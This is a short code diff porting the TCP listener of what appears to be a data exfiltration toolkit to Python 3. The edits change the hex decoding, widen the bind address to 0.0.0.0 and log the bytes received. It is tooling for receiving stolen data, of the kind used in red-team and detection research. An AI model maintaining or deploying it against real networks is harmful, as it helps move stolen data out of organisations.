@@ -1,4 +1,4 @@
-from binascii import hexlify
+from binascii import hexlify, unhexlify
 import socket
 import sys
 from random import choice
@@ -29,7 +29,7 @@ def sniff(handler):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     try:
-        server_address = ('', port)
+        server_address = ('0.0.0.0', port)
         sock.bind(server_address)
         app_exfiltrate.log_message(
             'info', "[tcp] Starting server on port {}...".format(port))
@@ -50,7 +50,7 @@ def sniff(handler):
                     app_exfiltrate.log_message(
                         'info', "[tcp] Received {} bytes".format(len(data)))
                     try:
-                        data = data.decode('hex')
+                        data = unhexlify(data).decode()
                         handler(data)
                     except Exception as e:
                         app_exfiltrate.log_message(
